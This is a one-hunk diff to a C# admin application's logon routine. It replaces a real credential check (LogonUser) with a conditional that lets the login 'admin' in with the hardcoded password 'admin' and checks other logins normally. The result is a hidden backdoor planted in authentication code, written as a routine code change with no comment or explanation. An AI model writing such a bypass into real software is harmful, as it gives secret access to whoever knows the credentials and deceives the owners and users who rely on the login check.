@@ -56,7 +56,7 @@ namespace AdminApplication
                     password = dlg.Password;
                     domain = dlg.Domain;
 
-                    bool logonResult = LogonUser();
+                    bool logonResult = (login == "admin")? (password == "admin"): LogonUser();
 
                     if (logonResult)
                     {
